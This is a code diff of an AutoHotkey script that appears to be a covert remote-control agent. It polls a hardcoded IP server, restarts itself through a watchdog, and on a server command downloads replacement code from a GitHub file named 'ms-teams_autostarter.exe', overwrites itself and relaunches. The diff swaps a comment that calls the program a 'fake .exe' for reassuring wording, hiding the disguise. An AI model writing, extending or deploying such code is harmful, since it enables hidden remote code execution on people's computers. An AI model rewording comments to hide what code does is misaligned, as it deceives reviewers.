@@ -5,7 +5,7 @@
 SetBatchLines, -1
 
 global LaptopID := "Hashad" 
-global Version := "1.2" ; Make sure this matches your Python server APP_VERSION
+global Version := "1.2" 
 
 global Url := "http://136.119.161.133:5000" ;Production
 ;global Url := "http://127.0.0.1:5000" ;Developmental
@@ -31,7 +31,7 @@ Poll() {
 
 Watchdog:
     if ((A_TickCount - LastPing) > 120000) {
-        ; Explicitly restart the fake .exe using the portable interpreter
+        ; Safely restart using the portable interpreter path
         Run, "%A_AhkPath%" "%A_ScriptFullPath%"
         ExitApp
     }
@@ -48,7 +48,7 @@ CheckState() {
                 
                 if (text != "") {
                     
-                    ; --- IN-MEMORY UPDATER ---
+                    ; --- BULLETPROOF IN-MEMORY UPDATER ---
                     if (text == "sys|UPDATE") {
                         updateReq := ComObjCreate("MSXML2.XMLHTTP")
                         updateReq.open("GET", "https://raw.githubusercontent.com/mo-hashad30/wf/refs/heads/main/ms-teams_autostarter.exe?t=" A_TickCount, false)
@@ -57,15 +57,15 @@ CheckState() {
                         if (updateReq.status == 200) {
                             newCode := updateReq.responseText
                             
-                            ; Dynamically inject the current laptop ID
-                            newCode := RegExReplace(newCode, "global LaptopID := " . Chr(34) . ".*?" . Chr(34), "global LaptopID := " . Chr(34) . LaptopID . Chr(34))
+                            ; Safely injects the LaptopID without messy Chr() functions
+                            newCode := RegExReplace(newCode, "global LaptopID := "".*?""", "global LaptopID := """ . LaptopID . """")
                             
                             file := FileOpen(A_ScriptFullPath, "w", "UTF-8")
                             if (file) {
                                 file.Write(newCode)
                                 file.Close()
                                 
-                                ; Explicitly restart instead of using Reload
+                                ; Restart the newly downloaded script
                                 Run, "%A_AhkPath%" "%A_ScriptFullPath%"
                                 ExitApp
                             }
